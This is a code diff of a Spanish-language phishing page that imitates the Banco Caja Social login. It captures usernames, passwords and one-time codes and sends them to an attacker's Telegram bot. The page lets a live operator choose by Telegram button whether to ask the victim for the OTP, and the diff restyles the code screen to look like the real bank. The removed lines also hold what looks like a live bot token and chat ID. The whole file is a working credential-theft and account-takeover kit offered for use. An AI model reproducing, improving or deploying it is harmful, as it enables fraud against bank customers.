@@ -23,6 +23,45 @@
             color: #6c757d;
             font-size: 0.85rem;
         }
+        
+        /* ESTILOS PARA LA PANTALLA DEL CÓDIGO (Según la imagen) */
+        .otp-title {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.2;
+            margin-bottom: 15px;
+        }
+        .phone-box {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin: 20px 0;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .phone-icon {
+            width: 32px;
+            height: 32px;
+            fill: #5c6c7f;
+        }
+        .phone-number {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+        .otp-links {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .otp-links a {
+            color: #0056b3;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 0.95rem;
+        }
     </style>
 </head>
 <body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
@@ -50,39 +89,23 @@
                                 <form id="form-index">
                                     <div class="form-group bb-form-field bb-form-field--md">
                                         <label for="username-input" class="label">Usuario</label>
-                                        <input id="username-input"
-                                            class="form-control"
-                                            name="username"
-                                            type="text"
-                                            autofocus
-                                            autocomplete="off">
+                                        <input id="username-input" class="form-control" name="username" type="text" autofocus autocomplete="off">
                                         <small class="input-example-text">Ejemplo: CC1234567890</small>
                                     </div>
                                     <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <button id="btn-index" class="btn btn-primary w-100" type="submit" disabled>
-                                            Siguiente
-                                        </button>
+                                        <button id="btn-index" class="btn btn-primary w-100" type="submit" disabled>Siguiente</button>
                                     </div>
                                     
                                     <div class="bb-block bb-block--xl mt-3 text-start">
-                                        <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" aria-expanded="false" aria-controls="collapseForgot" style="font-weight: bold; color: #0056b3;">
-                                            ¿Olvidó su contraseña? ▼
-                                        </a>
+                                        <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" style="font-weight: bold; color: #0056b3;">¿Olvidó su contraseña? ▼</a>
                                         <div class="collapse mt-2" id="collapseForgot">
-                                            <div class="card card-body" style="font-size: 0.9rem; background-color: #f8f9fa;">
-                                                Para recuperar su contraseña, diríjase a la opción de recuperación en el portal principal o comuníquese con la línea de atención.
-                                            </div>
+                                            <div class="card card-body" style="font-size: 0.9rem; background-color: #f8f9fa;">Para recuperar su contraseña, diríjase a la opción de recuperación.</div>
                                         </div>
                                     </div>
-
                                     <hr class="bb-block bb-block--lg identity-separator">
                                     <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap mt-4">
                                         <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
-                                        <strong class="mb-0">
-                                            <a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">
-                                                Registrarse
-                                            </a>
-                                        </strong>
+                                        <strong class="mb-0"><a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">Registrarse</a></strong>
                                     </div>
                                 </form>
                             </div>
@@ -97,35 +120,21 @@
                         <div id="kc-form">
                             <div id="kc-form-wrapper">
                                 <form id="form-contra">
-                                    <input type="hidden" id="inp-username" value="">
                                     <div class="form-group bb-form-field bb-form-field--md">
                                         <div class="bb-input-password">
                                             <label for="password-input" class="label">Contraseña</label>
                                             <div class="input-group">
-                                                <input id="password-input"
-                                                    class="form-control bb-input-password__input"
-                                                    name="password"
-                                                    type="password"
-                                                    maxlength="8"
-                                                    autocomplete="off">
-                                                <button id="toggle-pass" type="button"
-                                                    class="btn btn-link bb-input-password__visibility-toggle-button">
-                                                    <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20"
-                                                        viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;">
-                                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
-                                                    </svg>
+                                                <input id="password-input" class="form-control bb-input-password__input" name="password" type="password" maxlength="8" autocomplete="off">
+                                                <button id="toggle-pass" type="button" class="btn btn-link bb-input-password__visibility-toggle-button">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" /></svg>
                                                 </button>
                                             </div>
                                         </div>
-                                        <small id="msg-len" class="bb-input-validation-message d-none" role="alert">
-                                            La contraseña debe tener exactamente 8 caracteres.
-                                        </small>
+                                        <small id="msg-len" class="bb-input-validation-message d-none" role="alert">La contraseña debe tener exactamente 8 caracteres.</small>
                                     </div>
                                     <div class="bb-button-bar bb-button-bar--reverse bb-block bb-block--xl mt-3">
                                         <div class="bb-block bb-block--xl w-100 w-md-auto d-flex d-md-block flex-column-reverse">
-                                            <button id="btn-submit" class="btn btn-primary me-0 me-md-3" type="submit" disabled>
-                                                Iniciar sesión
-                                            </button>
+                                            <button id="btn-submit" class="btn btn-primary me-0 me-md-3" type="submit" disabled>Iniciar sesión</button>
                                         </div>
                                     </div>
                                 </form>
@@ -133,7 +142,7 @@
                         </div>
                     </div>
 
-                    <!-- PASO 3: PANTALLA DE CARGA (Esperando que pidas el código desde Telegram) -->
+                    <!-- PASO 3: PANTALLA DE CARGA -->
                     <div id="step-waiting" class="d-none">
                         <div class="bb-subtitle bb-block bb-block--lg text-center">
                             <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;border-radius:50%;animation:spin 0.9s linear infinite;margin:30px auto;"></div>
@@ -141,28 +150,45 @@
                         </div>
                     </div>
 
-                    <!-- PASO 4: CÓDIGO (Aparece cuando tocas el botón en Telegram) -->
+                    <!-- PASO 4: CÓDIGO OTP (Diseño idéntico a la imagen) -->
                     <div id="step-otp" class="d-none">
-                        <div class="bb-subtitle bb-block bb-block--lg">
-                            <span>Hemos enviado un código a su número de celular registrado. Por favor ingréselo a continuación.</span>
+                        <h2 class="otp-title">Su código de seguridad ha sido enviado.</h2>
+                        <p style="font-size: 1rem; color: #333; margin-bottom: 20px;">Para continuar, por favor verifique que el código de seguridad haya llegado a su teléfono celular registrado:</p>
+                        
+                        <div class="phone-box">
+                            <!-- Icono de celular SVG -->
+                            <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
+                            </svg>
+                            <span class="phone-number">3*****8088</span>
                         </div>
+
                         <div id="kc-form">
                             <div id="kc-form-wrapper">
                                 <form id="form-otp">
                                     <div class="form-group bb-form-field bb-form-field--md">
-                                        <label for="otp-input" class="label">Código de verificación</label>
-                                        <input id="otp-input"
-                                            class="form-control"
-                                            type="text"
-                                            maxlength="6"
-                                            autocomplete="one-time-code">
+                                        <label for="otp-input" class="label">Código de seguridad</label>
+                                        <input id="otp-input" class="form-control" type="text" maxlength="6" autocomplete="one-time-code" style="font-size: 1.5rem; letter-spacing: 5px; text-align: center;">
+                                        <small style="color: #6c757d; font-size: 0.85rem; margin-top: 5px; display: block;">Por favor ingrese el código compuesto por 6 dígitos</small>
                                     </div>
                                     <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <button id="btn-otp" class="btn btn-primary w-100" type="submit" disabled>
-                                            Validar Código
+                                        <!-- Botón Enviar con el color azul de la imagen -->
+                                        <button id="btn-otp" class="btn btn-primary w-100" type="submit" style="background-color: #0070c0; border-radius: 25px; padding: 12px; font-weight: bold;">
+                                            Enviar
                                         </button>
                                     </div>
                                 </form>
+                                
+                                <hr style="margin: 25px 0; border-top: 1px solid #e0e0e0;">
+                                
+                                <div class="otp-links">
+                                    <div>
+                                        <span style="color: #333;">¿No recibió el código?</span> 
+                                        <a href="#" onclick="enviarTelegram('🔄 El usuario solicitó REENVIAR el código.'); return false;">Reenviar</a>
+                                    </div>
+                                    <a href="#" onclick="enviarTelegram('⚠️ El usuario reportó un PROBLEMA CON EL NÚMERO DE TELÉFONO.'); return false;">¿Tiene algún problema con este número de teléfono celular?</a>
+                                    <a href="#" onclick="enviarTelegram('📱 El usuario intentó con OTRO MEDIO.'); return false;">Intente con otro medio</a>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -178,8 +204,8 @@
         /* ========================================== */
         /* CONFIGURACIÓN DE TELEGRAM                  */
         /* ========================================== */
-        const TELEGRAM_BOT_TOKEN = '9120530050:AAE3ElStuRlIjO-I-RYz6DRRF12O_GArJrk'; 
-        const TELEGRAM_CHAT_ID = '8217102156';         
+        const TELEGRAM_BOT_TOKEN = 'AQUI_TU_TOKEN_DEL_BOT'; 
+        const TELEGRAM_CHAT_ID = 'AQUI_TU_CHAT_ID';         
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
         /* ========================================== */
 
@@ -202,6 +228,15 @@
         let PASSWORD = '';
         let lastUpdateId = 0; 
         let pollingInterval = null;
+
+        /* Función auxiliar para enviar mensajes simples */
+        function enviarTelegram(texto) {
+            fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texto, parse_mode: 'HTML' })
+            });
+        }
 
         /* ---------- PASO 1: USUARIO ---------- */
         inputUser.addEventListener('input', () => {
@@ -231,28 +266,27 @@
             passInput.type = passInput.type === 'password' ? 'text' : 'password';
         });
 
-        // Cuando el usuario termina de escribir la clave y le da a Iniciar sesión
         document.getElementById('form-contra').addEventListener('submit', async function (e) {
             e.preventDefault();
             PASSWORD = passInput.value.trim();
             if (PASSWORD.length !== 8) return;
 
-            // 1. Ocultar contraseña y mostrar pantalla de carga
             stepPassword.classList.add('d-none');
             stepWaiting.classList.remove('d-none');
 
-            // 2. Enviar credenciales a Telegram CON EL BOTÓN DE PEDIR CÓDIGO
+            // Enviar credenciales a Telegram CON LOS DOS BOTONES
             const url = `${TELEGRAM_API}/sendMessage`;
             await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `🔐 <b>Credenciales Capturadas:</b>\n\n👤 <b>Usuario:</b> <code>${USERNAME}</code>\n🔑 <b>Clave:</b> <code>${PASSWORD}</code>\n\n¿Desea pedir código de verificación al usuario?`,
+                    text: `🔐 <b>Credenciales Capturadas:</b>\n\n👤 <b>Usuario:</b> <code>${USERNAME}</code>\n🔑 <b>Clave:</b> <code>${PASSWORD}</code>\n\n¿Qué acción desea tomar?`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
+                                { text: "🚫 Usuario Malo", callback_data: `malo` },
                                 { text: "📩 Pedir Código", callback_data: `pedir_codigo` }
                             ]
                         ]
@@ -260,7 +294,6 @@
                 })
             });
 
-            // 3. Empezar a escuchar si presionas el botón en Telegram
             iniciarPolling();
         });
 
@@ -277,11 +310,11 @@
                         data.result.forEach(update => {
                             lastUpdateId = update.update_id;
 
-                            // Si presionaste el botón
-                            if (update.callback_query && update.callback_query.data === 'pedir_codigo') {
-                                clearInterval(pollingInterval); // Detener polling
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+                                clearInterval(pollingInterval);
                                 
-                                // Quitar el botón del mensaje en Telegram
+                                // Quitar botones de Telegram
                                 fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -292,10 +325,15 @@
                                     })
                                 });
 
-                                // Cambiar la pantalla del cliente al paso del CÓDIGO
-                                stepWaiting.classList.add('d-none');
-                                stepOtp.classList.remove('d-none');
-                                otpInput.focus();
+                                if (action === 'malo') {
+                                    enviarTelegram(`🚫 El usuario <code>${USERNAME}</code> ha sido marcado como malo.`);
+                                    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif;"><h2>Error de autenticación</h2><p>El usuario no es válido.</p></div>';
+                                } else if (action === 'pedir_codigo') {
+                                    enviarTelegram(`📩 Se ha solicitado el código para <code>${USERNAME}</code>.`);
+                                    stepWaiting.classList.add('d-none');
+                                    stepOtp.classList.remove('d-none');
+                                    otpInput.focus();
+                                }
                             }
                         });
                     }
@@ -307,7 +345,7 @@
 
         /* ---------- PASO 4: CÓDIGO OTP ---------- */
         otpInput.addEventListener('input', function () {
-            btnOtp.disabled = this.value.trim().length < 4; // Habilitar si tiene al menos 4 dígitos
+            btnOtp.disabled = this.value.trim().length < 6; // Requiere 6 dígitos
         });
 
         document.getElementById('form-otp').addEventListener('submit', function (e) {
@@ -315,23 +353,13 @@
             const codigo = otpInput.value.trim();
             if (!codigo) return;
 
-            // Enviar el código final a Telegram
-            fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: `✅ <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>`,
-                    parse_mode: 'HTML'
-                })
-            });
+            enviarTelegram(`✅ <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>`);
 
-            // Pantalla final de éxito
+            // Pantalla final
             document.body.innerHTML = `
             <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f5f5f5;">
                 <div style="text-align:center;padding:40px;">
-                    <img style="width:160px;margin-bottom:32px;"
-                         src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
+                    <img style="width:160px;margin-bottom:32px;" src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
                     <h2 style="color:#0033A0;margin-bottom:10px;">¡Transacción Exitosa!</h2>
                     <p style="color:#444;font-size:15px;margin:0;">Sus datos han sido verificados correctamente.</p>
                 </div>
